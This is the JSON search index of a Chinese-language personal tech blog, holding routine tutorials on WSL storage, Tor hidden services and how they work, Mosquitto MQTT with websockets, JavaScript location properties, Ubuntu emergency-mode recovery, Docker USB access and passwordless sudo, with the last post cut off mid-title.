[{"content":"這沒有花里胡哨的農場，只有為學術落筆的文章。\n","date":"2024/11/25","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"2024/11/25","externalUrl":null,"permalink":"/posts/","section":"","summary":"","title":"","type":"posts"},{"content":"","date":"2024/11/25","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2024/11/25","externalUrl":null,"permalink":"/categories/computer-science/","section":"Categories","summary":"","title":"Computer-Science","type":"categories"},{"content":"","date":"2024/11/25","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"2024/11/25","externalUrl":null,"permalink":"/tags/wsl/","section":"Tags","summary":"","title":"WSL","type":"tags"},{"content":"Windows 的 WSL 佔用了太多系統空間，本文將介紹如何將其移動至自訂的硬碟位置。 步驟 # 關閉執行中的 WSL # 首先先關閉所有 WSL 視窗，然後選擇cmd或powershell執行以下指令徹底關閉 WSL：\n1wsl --shutdown 建立新的存放空間 # 成功關閉後，創建並進入新的存放位置：\n1# 假設我將資料夾建立在 D:/WSL2 2mkdir D:/WSL2 3cd D:/WSL2 查詢當前 distribution 名稱及狀態： # 透過以下指令查看現有的distribution：\n1wsl -l -v 2# 或者 3# wsl --list --verbose 接著應該會看到顯示類似以下內容：\n1 NAME STATE VERSION 2* Ubuntu Stopped 2 匯出 # 記住NAME及確定STATE是Stopped後，就可以匯出整個系統空間了：\n1wsl --export \u0026lt;NAME\u0026gt; \u0026lt;OUTPUT_FILE\u0026gt;.tar 2# 將 \u0026lt;NAME\u0026gt; 改成剛剛查詢到的 NAME； 3# \u0026lt;OUTPUT_FILE\u0026gt; 則改為輸出的檔案。 4# 例如： 5# wsl --export Ubuntu ./ubuntu.tar (可選)刪除舊空間 # 匯出完畢後可以選擇刪除舊的儲存空間(如果新的命名不重複也可以不刪)：\n1wsl --unregister Ubuntu 匯入 # 匯入空間到新環境：\n1wsl --import \u0026lt;NAME\u0026gt; \u0026lt;PATH\u0026gt; \u0026lt;INPUT_FILE\u0026gt; 2# 將 \u0026lt;NAME\u0026gt; 改為新的名稱，如與舊的相同，記得先執行上一步的「unregister」； 3# \u0026lt;PATH\u0026gt; 改為空間新存放的位置，例如先前已經移動到目錄，則直接設為「./」； 4# \u0026lt;INPUT_FILE\u0026gt; 則是剛剛匯出檔案的位置及檔名，例如「./ubuntu.tar」。 5# 例如： 6# wsl --import Ubuntu2 ./ ./ubuntu.tar 匯入完畢後基本上就大功告成了，而那個匯出的.tar檔案確認無誤後便可以刪除。\n可能需要注意的幾個小問題 # 終端記得更新為新的 distribution # 如果是使用如「Windows Terminal」之類的終端外殼，則記得更改啟動項：\np.s. 如果找不到新的 distribution，則可能重開後在設定中尋找。\n登入終端後並非欲設使用者，而是 root 身分 # 稱入後如果看到如下訊息：\nThis message is shown once a day. To disable it please create the /root/.hushlogin file. 則請按照提示在該目錄創建檔案：\n1touch /root/.hushlogin 然後編輯設定檔/etc/wsl.conf，添加如下資訊(將alpaca改為您的欲設用戶名)：\n[user] default=alpaca p.s. 上面設定的用戶名必須是存在的用戶，若不存在請自行創建。\n儲存後，關閉使用到該 distribution 的 WSL 視窗\n1wsl --terminate \u0026lt;NAME\u0026gt; 2# 將 \u0026lt;NAME\u0026gt; 改為 distribution 的名稱，如「Ubuntu2」： 3# wsl --terminate Ubuntu2 重開後應該就能自動以預設使用者身分登入，到此也就完成vhdx的移動了。\nReferences # 《how to move the vhdx of wsl2 to other disk · Issue #412 · MicrosoftDocs/WSL》https://github.com/MicrosoftDocs/WSL/issues/412 《windows subsystem for linux - Where are the files inside wsl2 physically stored? - Stack Overflow》https://stackoverflow.com/questions/64185560/ 《linux - How to set default user for manually installed WSL distro? - Super User》https://superuser.com/questions/1566022/ ","date":"2024/11/25","externalUrl":null,"permalink":"/posts/move-vhdx-of-wsl2-to-other-disk/","section":"","summary":"Windows 的 WSL 佔用了太多系統空間，本文將介紹如何將其移動至自訂的硬碟位置。","title":"移動 WSL 的儲存空間到其他硬碟","type":"posts"},{"content":"","date":"2024/11/18","externalUrl":null,"permalink":"/tags/tor/","section":"Tags","summary":"","title":"Tor","type":"tags"},{"content":"本文將說明如何架設 Tor 暗網，將你的服務隱匿在 Tor 當中。 前言 # 本文不推崇網路犯罪行為，僅作網路隱私及資訊安全相關學術研討。若使用本文介紹之相關技術從事犯罪活動，皆屬個人行為，與本站無關。 本文將不會再贅述關於Tor技術與暗網的原理或相關介紹，若不知道且想了解Tor原理的朋友，歡迎觀看我之前的文章「Tor 洋蔥路由、Hidden Service 原理解析」。\n安裝 Tor # 首先先安裝Tor。(注意：這邊指的Tor是指單純的洋蔥路由，而非Tor Browser 洋蔥瀏覽器)\n以 Ubuntu 為例：\n1apt install tor 設定 Tor Hidden Service # 找到設定檔torrc(以 Ubuntu 來說，設定檔在/etc/tor/torrc)，然後在最後加上這兩行：\n1HiddenServiceDir /var/lib/tor/other_hidden_service/ 2HiddenServicePort 80 127.0.0.1:80 將上方HiddenServiceDir的other_hidden_service/改為你的服務名稱，至於位置則建議設定在/var/lib/tor/之下，否則可能會有權限問題；\nHiddenServicePort後面則是洋蔥網路的 port及對應本地端欲導向的 host 與 port，舉例來說你本地端有台主機是192.168.0.2，並且在8080 port 開了一個網站，則可以透過如下設定，來將流量從網頁的80 port 導向至目的地：\n1HiddenServicePort 80 192.168.0.2:8080 p.s. 當然如果你有多個服務想架設在同個站點，可以依照需求添加HiddenServicePort。\n接著啟用 Tor 服務：\n1service tor start 2#或者服務重啟： 3service tor restart 完成 # 沒意外的話就可以在剛剛設定的HiddenServiceDir當中看見公、私鑰，以及一個叫做hostname的檔案，裡面便是你的暗網網址了。\n1/var/lib/tor/other_hidden_service $ ls 2authorized_clients/ hostname hs_ed25519_public_key hs_ed25519_secret_key 接著只需要保持 Tor 服務的開啟，就可以將洋蔥流量從該網址導向到本地的服務。\np.s. 千萬注意私鑰hs_ed25519_secret_key不能洩漏，否則將可能被劫持網站。(這又是另一個 Tor 有趣的機制了\u0026hellip;)\n自訂網域（？ # 在暗網的原理當中，其 domain 是透過公鑰的 hash 運算後產生的，因此應該會是亂碼。\n但若是算力夠的情況下，我們便可以透過爆破的方式自訂網域。\n不過顯然沒有這麼高算力的機器，但我們仍然可以嘗試爆破網域的開頭幾個字(或任意地方)。\n(要求自訂的長度越長，算力要求越高)\n這邊推薦一個工具，可以很方便地進行自訂網域的爆破工作－「mkp224o」。\n可以在 github 下載：https://github.com/cathugger/mkp224o\n照著文檔的方式安裝，並且執行，用法非常簡單，舉例我希望我的網域是以「alpaca」開頭，則：\n1./mkp224o alpaca 該程式便會持續爆破，產生並保留所有網域為 alpaca 開頭的檔案。\n你也可以指定資料夾(因為可能會有很多筆，導致產出的檔案很多)：\n1./mkp224o -d myFolder alpaca 這麼一來便會將結果存放在myFolder資料夾中。\nReferences # 《架設 Tor Hidden Service - HackMD》https://hackmd.io/@hbdoy/HJhkgGQvf ","date":"2024/11/18","externalUrl":null,"permalink":"/posts/build-tor-hidden-service/","section":"","summary":"本文將說明如何架設 Tor 暗網，將你的服務隱匿在 Tor 當中。","title":"架設暗網 - Tor Hidden Service","type":"posts"},{"content":"不用知道對方 IP 也能連線，以及架設隱藏於網路中的服務... Tor 及 Tor Hidden Service 有別於傳統 HTTP 協定的特點 # 高度匿蹤性：伺服器與客戶端雙方皆不需要知道對方 IP 位置即可連線，中間經過層層節點轉發，這也導致連接速度延遲較高。 加密的流量：多節點轉發的機制，以及分散式的對照表管理，使得MITM (中間人攻擊)幾乎不可能發生，流量打從一開始就已經加密直至目的地才解密。 仰賴節點服務：這項技術依賴世界各地的自願者架設 Tor 節點，以完整這張 Tor 鏈路網。 公鑰雜湊即網域：洋蔥路由的隱藏服務頂級域為「.onion」，其網域是一串經過 Hash 運算的公鑰，算法通常是SHA-3雜湊搭配Ed25519簽章。 Onion Routing (洋蔥鏈路) # 每個節點都來自世界各地的自願者，這些節點都有自己的公鑰與私鑰。\nTor Routing 示意動畫 加密 # 當 Client 想傳送加密訊息給Target節點時，Client從眾多的 Tor 節點中選擇A、B、C作為中繼節點。 Client將原始訊息經過Target節點的公鑰加密，將密文附上Target節點的 IP 後，再使用C節點的公鑰加密，接著再將加密後的訊息附上C節點的 IP 後，經過B節點的公鑰加密，最後再附上B節點的 IP 並透過A節點的公鑰加密，之後發送給A節點。 解密 # A節點收到加密訊息後，用自身私鑰解密，獲得B節點的 IP 以及密文，將密文轉發給B節點，接著B節點用自身私鑰解密後得到密文及C節點 IP，然後轉發至C節點，C節點再用自身私鑰解密後，獲得密文及Target節點 IP，最後轉發至Target節點。 Target節點用自身私鑰解密，獲得原始訊息。 整個過程中繼節點僅會知道前後節點的 IP，但不會知道訊息內容與目的地，而目標節點Target也只會得到上個中繼節點的 IP 以及原始訊息，但不會知道來源為何。\n而上述的洋蔥鏈路還有一個問題尚未解決，也就是當Client節點要發送訊息給目標節點Target時，必須知道Target節點的 IP 位置，這也就表示服務端不會是Target節點，否則就失去隱藏伺服端 IP 的目的了。\n特殊節點 # Guard Relay (入口節點)：表示客戶端進入 Tor 鏈路的首個節點。由於層層加密的原因，入口節點並不會知道客戶端的目的地以及原始訊息，不過因為是唯一與客戶端 IP 直接接觸的節點，因此許多入口節點是執法單位刻意架設的 Honey Pot。 Middle Relay (中繼節點)：協助轉發 Tor 流量的中間節點，是混淆流量來源的重要角色。 Exit Relay (出口節點)：該節點僅用於由 Tor 訪問外部互聯網時的流量，是作為 Tor 鏈路上的最後一個節點，用於將 Tor 流量轉發至一般互聯網。(若僅訪問 Tor 隱藏服務則不會經過該節點) Introduction Point (介紹節點)：用於將客戶端導向至伺服端所指定之反向鏈路的節點。(稍後介紹) Directory Nodes (目錄節點)：用於存放與管理Service Descriptor (服務描述符)。(稍後介紹) Rendezvous Point (會合節點)：由客戶端提供，指定伺服端回應的位置。(稍後介紹) 分散式雜湊表 (DHT, Distributed Hash Table) # 在開始介紹 Tor 隱藏服務的核心概念前，先來說一個分散式管理的概念 - 分散式雜湊表 (DHT, Distributed Hash Table)。這是一種用於點對點傳輸的架構，適合擁有大量節點的環境。\n(若還不知道什麼是「Hash (雜湊)」，可以觀看我之前的文章「Encode、Encrypt and Hash are different！」)\n在一個點對點的環境當中，節點各自會有一張Routing Table (路由表)用於記錄其他節點的 IP 位置與 hash 值(可能來自公鑰)。\n但這張表中所記錄的節點並非隨機，而是會選擇與其本身「最接近」的節點(這邊的接近並非指現實距離)。\n何謂「接近」？如何計算節點間的距離？\n首先 hash 值本身就是數字(通常以 16 進制表示)，以 SHA-1 運算所產出的 hash 值來說，長度為 160 bits，也就是說該 hash 的有效範圍在 0 ~ 2^160 之間，是一個非常大的數。 節點本身會有一組 hash，可能來自公鑰，或者 IP 位置等(具體看系統如何設計)，在獲取別的節點的 hash 值後，會將其比對自身 hash 值，並挑選出較為接近的節點後記錄於路由表中。這張表會持續更新，若發現表中的某個節點無法連線時，也會對其進行刪除。 這麼一來就賦予了節點之間「距離」的關係，也可以透過路由表來持續更新，以記錄與自身節點較為接近的節點列表。\n(還是不理解的朋友，請自行翻閱資料或觀看維基百科「分散式雜湊表」，該概念在後續提到時不再進行解釋)\nTor Hidden Service (Tor 隱藏服務) # Tor 提供了一項技術叫做「Tor Hidden Service (Tor 隱藏服務)」，該服務可以將伺服端的 IP 位置隱藏，並提供用戶透過 Tor 鏈路連接。\n這是一個衍伸的協定，必須透過特殊的瀏覽器連接，大多數傳統的瀏覽器是不支援 Tor 路由的(「Brave Browser」內建支援)，Tor 有屬於自己專屬的瀏覽器，叫做「Tor Browser」。\n具體步驟如下：\n公布網域、公鑰與鏈路資訊 # 伺服端生成一對公私鑰，並將公鑰進行 Hash 運算後加上「.onion」作為 Tor 隱藏服務之網址。 伺服端生成反向鏈路，該步驟與上述的洋蔥路由原理一致，只是終點為自身服務的 IP 位置，因此任何人有該反向鏈路即可連接至伺服端主機。 伺服端隨機挑選幾個節點作為「Introduction Point (介紹節點)」，並使用洋蔥鏈路將自身的公鑰以及步驟二所生成的反向鏈路對其進行數位簽章後一同發送給介紹節點。由於過程是由洋蔥鏈路發送，因此介紹節點也不會知道隱藏服務真正的位置，並且介紹節點可以透過公鑰驗證其簽名。(若不知道何為數位簽章，可以觀看我之前的文章「非對稱加密 (Asymmetric Cryptography)」) 伺服端生成Service Descriptor (服務描述符)，其中包含步驟三所挑選的介紹節點之列表以及自身公鑰、數位簽章、有效期限，由於該資訊是會定期更新的，因此需要給予有效期限來聲明資訊生命週期。接著透過先前 DHT 技術所提到節點距離計算的方式，挑選幾個與該服務公鑰之 hash 值相近的節點，將服務描述符發送給這些節點。這些節點會檢查該服務公鑰之 hash 值與自身節點的距離，並檢查自身路由表中是否有離該 hash 值更近距離的節點，如果有，則會將從伺服端所接收到的資訊轉傳給該節點，並且後續節點將持續該步驟，直到找不到更近的節點後記錄在路由表中；如果沒有，且距離相對該節點與路由表中的節點更遠，這時該節點可能依舊會保留，又或者會轉傳給其他節點嘗試繼續尋找更近的節點，這取決於許多因素，但不在本文討論範圍。 客戶端請求隱藏服務 # 客戶端可以向中繼節點們查詢隱藏服務網址上的公鑰 hash 值，這些節點會依照與先前步驟一樣的方式找到相近且有紀錄該 hash 值的節點，接著回傳該服務的服務描述符。 由於伺服端也需要回應客戶端，因此客戶端在向伺服端發送請求前，會先隨機找尋一個中繼節點作為「Rendezvous Point (會合節點)」，使伺服器能夠回傳訊息。客戶端與會合節點建立連線，並提供一條反向鏈路，該鏈路會有一個叫做「會合識別符 (Rendezvous Cookie)」的唯一識別碼，相當於給鏈路取名(官方上對格式的說明是「an arbitrary 20-byte value, chosen randomly by the client」)，接著介紹節點便會在會合表 (Rendezvous Table)中記錄會合辨識符所對應的反向鏈路。 客戶端從服務描述符中獲取該服務之介紹節點列表，隨機選擇一個介紹節點，並透過洋蔥鏈路與其建立連線，且除了發送請求外，還會生成臨時加密用的公鑰(與傳統 SSL 類似)，附上臨時公鑰與步驟二中提到的會合節點 IP、會合識別符給伺服端做回應使用。當然，這些資訊也都經過伺服端公鑰加密，且過程皆經由洋蔥鏈路收發，所以即便是介紹節點，也不知道客戶端與伺服端的 IP 位置。 介紹節點接收到客戶端請求後，將客戶端的請求透過先前伺服端給的反向鏈路轉發至伺服端。 伺服端收到請求後透過自身私鑰解密，獲取客戶端請求資訊。 隱藏服務回應客戶端 # 伺服端處理請求後，將回應訊息透過客戶端提供的臨時金鑰加密，附帶客戶端提供的會合識別符，一同發送至會合節點作為回應(p.s. 連接客戶端提供之會合節點的過程也是經過洋蔥鏈路的)。 會合節點透過會合識別符得知客戶端的反向鏈路，將訊息轉發至客戶端指定之鏈路。 客戶端從自己建立的反向鏈路中收到伺服端的回應，透過方才生成的臨時公鑰所對應的密鑰解密後獲得原始回應訊息。 客戶端連接一般互聯網 # Tor 並不僅是設計用於封閉的洋蔥網絡，你也可以透過 Tor 鏈路訪問一般的互聯網站點。\n當你嘗試在 Tor 瀏覽器中訪問互聯網站點時，該 Tor 鏈路會將終點的前一個節點選擇「Exit Relay (出口節點)」而非介紹節點，並且一樣會附帶會合節點 IP及會合識別符給出口節點，出口節點會將其記錄於會合表中，而在出口節點之後的流量便是處於一般的互聯網，出口節點正常發送請求至伺服端站點，並將伺服端回應透過客戶端生成的金鑰加密後，連同會合識別符一同發送給會合節點，後續皆與隱藏服務流程相同。\n這個出口節點等同承擔了用戶的最終流量，通常也伴隨著更高的風險，因此用戶的架設意願通常會相較一般中繼節點更低。\n結語 # 至此 Tor 的通訊原理就解釋得差不多了，不禁感慨該技術在背後隱藏著如此多的技術及架構設計，下次在使用時，如果覺得速度很慢，別忘記世界各地的節點們正努力的幫你傳接流量。\nReferences # 《Tor - 維基百科》https://zh.wikipedia.org/zh-tw/Tor 《分散式雜湊表 - 維基百科》https://zh.wikipedia.org/zh-tw/%E5%88%86%E6%95%A3%E5%BC%8F%E9%9B%9C%E6%B9%8A%E8%A1%A8 《SHA-1 - 維基百科》https://zh.wikipedia.org/zh-tw/SHA-1 ","date":"2024/10/25","externalUrl":null,"permalink":"/posts/tor/","section":"","summary":"不用知道對方 IP 也能連線，以及架設隱藏於網路中的服務...","title":"Tor 洋蔥路由、Hidden Service 原理解析","type":"posts"},{"content":"非常好用的 MQTT Server，還支援 Websocket 協定轉發！ 簡介 # MQTT 是一種通訊協定，常被用於 IoT 設備，強大的特點在於可以雙向的即時收發資訊，適合用於有即時更新資訊需求的應用情境。\n其接收訊息的方式是採取對「Topic (頻道)」採取「Subscribe (訂閱)」的方式，有點像RSS的感覺；而發送訊息則是採用「Publish (發布)」，當 publish 至 topic 時，有訂閱該 topic 的 client 端即可即時的收到訊息。\nMQTT Brocker # 這種機制仰賴的是將 publish 的訊息轉發至有 subscribe 其 topic 的 client 端，因此需要一個中介來進行，該服務稱作「Brocker」。\n不過這也並非是單純轉發這麼簡單，很多時候應用場景更為複雜，例如用戶的登入機制，以及限制 topics 對於用戶的 publish 或 subscribe 權限\u0026hellip;等。\n不支援 Web 端的直接應用 # MQTT 縱使方便，但在實務開發上仍會遇到的一個阻礙：「Web 端並不支援直接連線」。\n眾所周知，網頁仰賴HTTP協定，而 MQTT 協定並非建立於 HTTP 之上的。\n網頁上為了達到有效的雙向即時更新資料，會採取 HTTP 的升級協定「Weboscket」來進行。\n伺服器與客戶端會先以 HTTP 的協定進行握手後，建立升級協定，將協定轉為wss://(即websocket)建立通訊通道，在此之後便可以透過該通道即時的收發資訊。\n為了解決該阻礙，就必須要另外架設一個 websocket server 來將網頁的流量轉發至 mqtt server，並且還要另外對 websocket server 稍做修改，使其實現 mqtt 的訂閱機制，這將會是一個不小的工程。\nMosquitto # 這是一個開源的應用，用於擔任 mqtt brocker 的角色，其命名相較蚊子的英文mosquito多了一個t。\n該應用強大的點在於，不僅方便對 mqtt server 設定用戶登入機制，還可以對其 topics 權限進行配置。\n更厲害的是，它解決了上述提到的 websocket 流量轉發的問題，讓 websocket 與 mqtt 之間的溝通變得不再有阻礙。\n安裝 Mosquitto # 以 Ubuntu 為例：\n1# Install 2sudo apt-get install mosquitto 3# Start service 4sudo service mosquitto start 這樣就完成了！\n接著就可以在裝置上訪問1883port (mqtt 預設) 與 mqtt server 溝通。\n設定 Mosquitto # 在/etc/mosquitto/中，可以透過修改設定檔mosquitto.conf來對其進行進階的功能設定。\n使其支援 Weboscket 流量轉發 # 以原本設定檔中的 mqtt 協定只有設置以下內容：\n1listener 1883 2protocol mqtt 可以加上 websocket 的支援：\n1listener 9001 # port 可以自行更改 2protocol websockets #注意結尾\u0026#34;s\u0026#34; 若要使其監聽整個網段，而非僅是本地端，則指定 IP 0.0.0.0：\n1listener 1883 0.0.0.0 2protocol mqtt 3 4listener 9001 0.0.0.0 5protocol websockets 登入帳號列表設定 # 若要允許使用者不必登入，則可以在設定檔mosquitto.conf中加上：\n1# 即便啟用該功能，依舊可以登入，並不衝突 2allow_anonymous true 也可以生成一個檔案用於存放使用者帳號密碼，首先先在/etc/mosquitto/創建一個空的文字檔「passwd(也可以自訂其他檔名或路徑)」。\n之後將該檔案的路徑寫入mosquitton.conf設定檔中：\n1password_file /etc/mosquitto/passwd 創建帳戶則可以使用mosquitto_passwd指令來完成，舉例創建一個名為admin的帳號：\n1mosquitto_passwd -c /etc/mosquitto/passwd admin 2# 接著會要求輸入該帳號的密碼 執行完後就會發現該檔案多了一行admin:\u0026lt;hash\u0026gt;，前面為用戶名，後面為密碼(該密碼進行過雜湊運算)。\n設定 Access 權限 # 一樣創建設定檔，並添加設定檔路徑至mosquitto.conf中：\n1acl_file /etc/mosquitto/acl_file 在/etc/mosquitto/acl_file檔案中可以這麼設定：\n1topic read news/# 2topic write news/comment 3 4user admin 5topic readwrite news/# 符號「#」表示通配符，有點類似「*」，表示任意長度字元。\n上方未指定 user 的區塊是作用於未登入帳戶的，topic read news/#表示可以訂閱所有news/開頭的 topics，而topic write news/comment則表示對news/comment 這個 topic 有 publish 的權限(但並沒有news/comment/的權限，mqtt 對於 topic 的斜線/敏感)。\n下方指定了user admin表示是作用於用戶admin的設定，topic readwrite news/#表示該用戶對於news/開頭的所有 topics 具有 publish 及 subscribe 的權限。\n還有一個更進接的 topic 比對寫法：\n1pattern read client/%c/# 2pattern read user/%u/# pattern表示比對特殊符號，在 mosquitto 中有兩個特殊符號用於該設定，分別是代表client id的「%c」；以及代表username的「%u」。\n所謂username是指帳號名稱，例如上述的admin；而client id則是客戶端連接 mqtt 時可以自行設置的。\n舉例來說，當用戶的 client id 為「machine123」，username 為user123時，該例子指的是該用戶可以 subscribe 所有client/machine123/開頭的 topics，以及所有user/user123/開頭的 topics。\n官方文檔的用法說明：\n1allow_anonymous [ true | false ] 2 3user \u0026lt;username\u0026gt; 4 5topic [read|write|readwrite|deny] \u0026lt;topic\u0026gt; 6 7pattern [read|write|readwrite|deny] \u0026lt;topic\u0026gt; 8 %c to match the client id of the client 9 %u to match the username of the client 讓 Javascript 支援 MQTT 轉接的 Websocket # 這部份已經有套件可以使用，像是最有名的MQTT.js：https://github.com/mqttjs/MQTT.js\n或者你跟我一樣更喜歡輕便的純檔案版本：https://cdnjs.com/libraries/mqtt\nFor exmaple:\n1// esm 方式引入 2import MQTT from \u0026#39;/Laundry/js/mqtt.js\u0026#39;; 3// 連接 mosquitto 監聽的 websocket port， 4// MQTT.connect() 的第二個參數為 options，也可以不指定 5const client = MQTT.connect(\u0026#39;wss://mqtt.example.org:9001\u0026#39;, { 6 cliendId: \u0026#39;user123\u0026#39;, 7 username: \u0026#39;admin\u0026#39;, 8 password: \u0026#39;secret\u0026#39;, 9}); 10// 連接事件 callback 11client.on(\u0026#39;connect\u0026#39;, (connack)=\u0026gt;{}); 12// subscribe 所有 topics 13client.subscribe(\u0026#39;#\u0026#39;); 14// 接收訊息事件 callback 15client.on(\u0026#39;message\u0026#39;, (topic, payload)=\u0026gt;{}); 16 17// 事件支援 connect, reconnect, close, disconnect, offline, error, end, message, packetsend, packetreceive... 詳情請見官方文檔：https://github.com/mqttjs/MQTT.js/blob/main/README.md\nReferences # 《Documentation | Eclipse Mosquitto》https://mosquitto.org/documentation/ 《mqttjs/MQTT.js: The MQTT client for Node.js and the browser》https://github.com/mqttjs/MQTT.js ","date":"2024/10/19","externalUrl":null,"permalink":"/posts/mqtt-mosquitto/","section":"","summary":"非常好用的 MQTT Server，還支援 Websocket 協定轉發！","title":"Mosquitto | 讓 JS 也支援 MQTT","type":"posts"},{"content":"","date":"2024/10/19","externalUrl":null,"permalink":"/tags/mqtt/","section":"Tags","summary":"","title":"MQTT","type":"tags"},{"content":"","date":"2024/10/19","externalUrl":null,"permalink":"/tags/websocket/","section":"Tags","summary":"","title":"Websocket","type":"tags"},{"content":"","date":"2024/10/19","externalUrl":null,"permalink":"/tags/javascript/","section":"Tags","summary":"","title":"Javascript","type":"tags"},{"content":"How to get infomations of URL on javascript? Table # For example url https://example.org:8080/path/?arg=a\u0026amp;arg2=b#toc:\nProperty Value Blankable href https://example.org:8080/path/?arg=a\u0026amp;arg2=b#toc origin https://example.org protocol https: hostname example.org host example.org:8080 only \u0026quot;example.org\u0026quot; when using default port port 8080 empty \u0026quot;\u0026quot; when using default port pathname /path/ at least the root path \u0026quot;/\u0026quot; search ?arg=a\u0026amp;arg2=b empty \u0026quot;\u0026quot; when no arguments (event write the question sign \u0026quot;?\u0026quot;) hash #toc empty \u0026quot;\u0026quot; when no toc (even write the hash sign \u0026quot;#\u0026quot;) References # 《[JS] Javascript 取得目前 URL 與相關參數(總整理)》https://seanacnet.com/js/location/ 《javascript - location.host vs location.hostname and cross-browser compatibility? - Stack Overflow》https://stackoverflow.com/questions/6725890/location-host-vs-location-hostname-and-cross-browser-compatibility ","date":"2024/10/19","externalUrl":null,"permalink":"/posts/javascript-location-properties/","section":"","summary":"How to get infomations of URL on javascript?","title":"Javascript Location Properties","type":"posts"},{"content":"","date":"2024/07/04","externalUrl":null,"permalink":"/tags/ubuntu/","section":"Tags","summary":"","title":"Ubuntu","type":"tags"},{"content":"這通常是因為磁區掛載時遇到嚴重錯誤導致的。 查看系統 log # 通常該錯誤是發生在系統自動掛載磁區時發生錯誤，可以按照提示的指令查看系統 log 檔：\n1journalctl -xb 接著可以透過方向鍵或PgUp、PgDown來查看紀錄，當然也可以透過按下/來查找關鍵字。\n試著找到有紅字的部份，通常就會知道有問題的部份在哪。\n嘗試修復 # 如果是磁區問題，那請先嘗試修復該磁區。\n當然，前提要先umount，假設有問題的磁區在/dev/sda2：\n1# 先 umount 2umount /dev/sda2 3# 嘗試修復 4fsck -y /dev/sda2 重新開機後，若問題仍然存在，可以嘗試再重新開機一次，並在grub選單時，選擇進入Advanced options for Ubuntu：\n接著選擇有「recovery」的核心，進入後會看到如下畫面：\n選擇「fsck」後照著指示進行修復作業。\n取消自動掛載 # 若重新開機後依舊無法進入正常的模式，\n那請編輯/etc/fstab，將有問題的磁區給暫時註解，不讓其自動掛載。\n(若出問題的磁區在root就可能需要另外使用映像檔來進入Try Ubuntu的模式從外部修復)\n重新開機後，應該要可以正常運作，否則請依照上方步驟繼續查看 log 並排除錯誤。\n至於出現錯誤的磁區，若 fsck 自動修復也無效，可能就要另外爬文了，畢竟這水也不是一般深\u0026hellip;\nReferences # 《boot - Stuck with \u0026ldquo;You are in emergency mode. \u0026quot; - Ask Ubuntu》https://askubuntu.com/questions/1466901/stuck-with-you-are-in-emergency-mode ","date":"2024/07/04","externalUrl":null,"permalink":"/posts/ubuntu-emergency-mode/","section":"","summary":"這通常是因為磁區掛載時遇到嚴重錯誤導致的。","title":"解決 Ubuntu 進入「Emergency Mode」的問題","type":"posts"},{"content":"","date":"2024/07/01","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":"","date":"2024/07/01","externalUrl":null,"permalink":"/tags/usb/","section":"Tags","summary":"","title":"USB","type":"tags"},{"content":" Linux # 方法一：使用--device參數 # 1docker run -it --device=/dev/ttyUSB0 ubuntu bash 如此一來便能讓其使用/dev/ttyUSB0接口\n方法二(不推薦)：使用--privileged參數開通所有權限 # 1docker run -it --privileged -v /dev/bus/usb:/dev/bus/usb ubuntu bash 簡單暴力，可以直接將/dev/bus/usb掛載入容器使其得以訪問，但也伴隨著較高的資安風險。\nWindows # 方法一(推薦)：安裝 WSL 2，以建立 Linux 環境 # 由於其實 docker 也是依賴 linux 環境，因此在 windows 系統下，該方法是最為推薦的。\n安裝方法請見官方文檔：https://learn.microsoft.com/en-us/windows/wsl/install\n方法二：使用 USB over IP 工具 # 這類工具有很多，如 USB/IP PROJECT 就是一個較常見的工具。\n接著只要在容器中安裝usbip，並 attach 上 windows 設備即可：\n1sudo apt update 2sudo apt install usbip 3sudo modprobe vhci-hcd 4sudo usbip attach -r \u0026lt;windows-ip\u0026gt; -b \u0026lt;busid\u0026gt; 方法三：將接口轉網路設備 # 一樣工具有很多，以下以其中一個知名的工具便是socket cat (socat)。\n安裝並設定完後，在容器中執行：\n1sudo apt update 2sudo apt install socat 3socat TCP:\u0026lt;windows-ip\u0026gt;:\u0026lt;port\u0026gt; /dev/ttyUSB0,raw,echo=0 References # 《Docker - a way to give access to a host USB or serial device? - Stack Overflow》https://stackoverflow.com/questions/24225647/docker-a-way-to-give-access-to-a-host-usb-or-serial-device ","date":"2024/07/01","externalUrl":null,"permalink":"/posts/docker-access-host-usb/","section":"","summary":"","title":"如何在 Docker 中訪問主機 USB ?","type":"posts"},{"content":"Make your username able to run \u0026#34;sudo\u0026#34; without password. Notice # The commands mentioned next may require root permission.\nOption. 1: add config directly # Edit config file /etc/sudoers (or you can just run command \u0026ldquo;visudo\u0026rdquo;):\n1visudo 1# 2# This file MUST be edited with the \u0026#39;visudo\u0026#39; command as root. 3# 4# Please consider adding local content in /etc/sudoers.d/ instead of 5# directly modifying this file. 6# 7# See the man page for details on how to write a sudoers file. 8# 9Defaults env_reset 10Defaults mail_badpass 11Defaults secure_path=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\u0026#34; 12 13# Host alias specification 14 15# User alias specification 16 17# Cmnd alias specification 18 19# User privilege specification 20root ALL=(ALL:ALL) ALL 21 22# Members of the admin group may gain root privileges 23%admin ALL=(ALL) ALL 24 25# Allow members of group sudo to execute any command 26%sudo ALL=(ALL:ALL) ALL 27 28# See sudoers(5) for more information on \u0026#34;#include\u0026#34; directives: 29 30#includedir /etc/sudoers.d Add the following config to last line (at least, it should be put after %sudo ALL=(ALL:ALL) ALL):\n1alpaca ALL=(ALL:ALL) NOPASSWD:ALL Don\u0026rsquo;t forget to change the username alpaca to name of you own user.\n(For saving and leaving the editing mode, press ctrl+x, then press y.)\nOption. 2: create a config file on /etc/sudoers.d/ # First step is same, Edit config file /etc/sudoers (or you can just run command \u0026ldquo;visudo\u0026rdquo;):\n1visudo And uncomment \u0026ldquo;#includedir /etc/sudoers.d\u0026rdquo;:\n1#includedir /etc/sudoers.d 1includedir /etc/sudoers.d (For saving and leaving the editing mode, press ctrl+x, then press y.)\nThen create a file on /etc/sudoers.d/, for example filename \u0026ldquo;alpaca\u0026rdquo;:\n1touch /etc/sudoers.d/alpaca Also write the config into the file:\n1alpaca ALL=(ALL:ALL) NOPASSWD:ALL Don\u0026rsquo;t forget to change the username alpaca to name of you own user.\nReferences # 《command line - Execute sudo without Password? - Ask Ubuntu》https://askubuntu.com/questions/147241/execute-sudo-without-password ","date":"2024/06/15","externalUrl":null,"permalink":"/posts/run-sudo-command-without-password/","section":"","summary":"Make your username able to run \u0026#34;sudo\u0026#34; without password.","title":"How to run \"sudo\" command without typing 